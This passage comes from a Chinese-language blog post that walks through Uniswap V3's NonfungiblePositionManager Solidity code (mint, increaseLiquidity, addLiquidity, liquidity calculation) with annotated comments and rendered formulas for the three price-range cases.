class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @inheritdoc INonfungiblePositionManager<br>    //mint函数实现初始的流动性的添加<br>    function mint(MintParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline) //modifier，确保_blockTimestamp() &lt;= deadline<br>        returns (<br>            uint256 tokenId,<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        IUniswapV3Pool pool;<br>        //添加流动性，并完成token0和token1的发送<br>        //核心，在下面进行解释<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: params.token0,<br>                token1: params.token1,<br>                fee: params.fee,<br>                recipient: address(this),<br>                tickLower: params.tickLower,<br>                tickUpper: params.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min<br>            })<br>        );<br><br>        //铸造 ERC721 token 给用户，用来代表用户所持有的流动性<br>        _mint(params.recipient, (tokenId = _nextId++));<br><br>//由创建地址和边界return keccak256(abi.encodePacked(owner, tickLower, tickUpper))<br>        bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);<br>        // feeGrowthGlobal0X128 和 feeGrowthGlobal1X128 ，分别表示此 position 内的 token0 和 token1 所累计的手续费总额。它只会在 position 发生变动，或者用户提取手续费时更新<br>        //pool.positions是一个mapping，mapping(bytes32 =&gt; Position.Info) public override positions<br>        //Position.Info是一个struct，在Position.sol中<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        // idempotent set<br>        uint80 poolId =<br>            cachePoolKey(<br>                address(pool),<br>                PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee})<br>            );<br><br>//更新mapping _positions，用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来<br>        _positions[tokenId] = Position({<br>            nonce: 0,<br>            operator: address(0),<br>            poolId: poolId,<br>            tickLower: params.tickLower,<br>            tickUpper: params.tickUpper,<br>            liquidity: liquidity,<br>            feeGrowthInside0LastX128: feeGrowthInside0LastX128,<br>            feeGrowthInside1LastX128: feeGrowthInside1LastX128,<br>            tokensOwed0: 0,<br>            tokensOwed1: 0<br>        });<br><br>        emit IncreaseLiquidity(tokenId, liquidity, amount0, amount1);<br>    }<br><br>...<br><br>//increaseLiquidity函数实现了流动性的增加，与上面的mint类似<br>    function increaseLiquidity(IncreaseLiquidityParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline)<br>        returns (<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        Position storage position = _positions[params.tokenId];<br><br>        PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];<br><br>        IUniswapV3Pool pool;<br>        //核心<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: poolKey.token0,<br>                token1: poolKey.token1,<br>                fee: poolKey.fee,<br>                tickLower: position.tickLower,<br>                tickUpper: position.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min,<br>                recipient: address(this)<br>            })<br>        );<br><br>        bytes32 positionKey = PositionKey.compute(address(this), position.tickLower, position.tickUpper);<br><br>        // this is now updated to the current transaction<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        position.tokensOwed0 += uint128(<br>        //计算a×b÷denominator<br>            FullMath.mulDiv(<br>                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128, //a<br>                position.liquidity, //b<br>                FixedPoint128.Q128 //denominator，这里等于0x100000000000000000000000000000000<br>            )<br>        );<br>        position.tokensOwed1 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br><br>        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;<br>        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;<br>        position.liquidity += liquidity;<br><br>        emit IncreaseLiquidity(params.tokenId, liquidity, amount0, amount1);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="addLiquidity"><a href="#addLiquidity" class="headerlink" title="addLiquidity"></a>addLiquidity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  struct AddLiquidityParams {<br>      address token0; //token0的地址<br>      address token1; //token1的地址<br>      uint24 fee; //交易费率<br>      address recipient; //流动性所属人地址<br>      int24 tickLower; //流动性价格下限（以token0计价），这里传入的是 tick index<br>      int24 tickUpper; //流动性价格上限（以token0计价），这里传入的是 tick index<br>      uint256 amount0Desired; //<br>      uint256 amount1Desired;<br>      uint256 amount0Min; //提供的token0下限数<br>      uint256 amount1Min; //提供的token1下限数<br>  }<br><br>  /// @notice Add liquidity to an initialized pool<br>  function addLiquidity(AddLiquidityParams memory params)<br>      internal<br>      returns (<br>          uint128 liquidity,<br>          uint256 amount0,<br>          uint256 amount1,<br>          IUniswapV3Pool pool<br>      )<br>  {<br>  //检索对应的流动性池<br>      PoolAddress.PoolKey memory poolKey =<br>          PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee});<br><br>//不需要访问factory就可以计算出pool的地址，原理在上面的CREATE2部分<br>      pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));<br><br>      // compute the liquidity amount<br>      //计算流动性的大小，详见下文<br>      {<br>          (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();<br>          uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(params.tickLower);<br>          uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(params.tickUpper);<br><br>          liquidity = LiquidityAmounts.getLiquidityForAmounts(<br>              sqrtPriceX96, //意思是价格P的平方根, 然后左移了96位保存精度<br>              sqrtRatioAX96,<br>              sqrtRatioBX96,<br>              params.amount0Desired,<br>              params.amount1Desired<br>          );<br>      }<br><br>      (amount0, amount1) = pool.mint(<br>          params.recipient,<br>          params.tickLower,<br>          params.tickUpper,<br>          liquidity,<br>          //用于 pool 合约回调<br>          abi.encode(MintCallbackData({poolKey: poolKey, payer: msg.sender}))<br>      );<br><br>      require(amount0 &gt;= params.amount0Min &amp;&amp; amount1 &gt;= params.amount1Min, 'Price slippage check');<br>  }<br></code></pre></td></tr></table></figure><h3 id="getLiquidityForAmounts"><a href="#getLiquidityForAmounts" class="headerlink" title="getLiquidityForAmounts"></a>getLiquidityForAmounts</h3><p>用来计算流动性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @notice Computes the maximum amount of liquidity received for a given amount of token0, token1, the current<br>  /// pool prices and the prices at the tick boundaries<br>  /// @param sqrtRatioX96 A sqrt price representing the current pool prices<br>  /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary<br>  /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary<br>  /// @param amount0 The amount of token0 being sent in<br>  /// @param amount1 The amount of token1 being sent in<br>  /// @return liquidity The maximum amount of liquidity received<br>  function getLiquidityForAmounts(<br>      uint160 sqrtRatioX96,  //当前矿池价格的平方根<br>      uint160 sqrtRatioAX96, //第一个tick边界的价格的平方根<br>      uint160 sqrtRatioBX96, //第二个tick边界的价格的平方根<br>      uint256 amount0, //发送的token0的数量<br>      uint256 amount1 //发送的token1的数量<br>      //返回收到的最大流动性金额<br>  ) internal pure returns (uint128 liquidity) {<br>  //排序，保证sqrtRatioAX96&lt;sqrtRatioBX96<br>      if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>//情况1<br>      if (sqrtRatioX96 &lt;= sqrtRatioAX96) {<br>          liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);<br>      //情况2    <br>      } else if (sqrtRatioX96 &lt; sqrtRatioBX96) {<br>          uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>          uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>          liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br>      //情况3    <br>      } else {<br>          liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><p>情况1：当前池中的价格小于等于价格范围的最小值</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819160147301.png" alt="image-20220819160147301"></p><p>此时添加的流动性全部为x token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="16.791ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 7421.8 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2001.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(771.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g><rect width="1657.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(2119.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3119.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5167.2" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>以上过程表示在getLiquidityForAmount0中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount0(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount0<br>) internal pure returns (uint128 liquidity) {<br>//排序<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    //sqrtRatioAX96*sqrtRatioBX96/FixedPoint96.Q96<br>    uint256 intermediate = FullMath.mulDiv(sqrtRatioAX96, sqrtRatioBX96, FixedPoint96.Q96);<br>    return toUint128(FullMath.mulDiv(amount0, intermediate, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><p>情况二：当前池中的价格在价格范围中</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819160225006.png" alt="image-20220819160225006"></p><p>此时添加的流动性包含两个币种，可以通过任意一个 token 数量计算出流动性<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="32.634ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 14424 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(1977.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(747.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><rect width="1609.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(2071.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3071.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5119.2" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(7651.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(8707.3,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 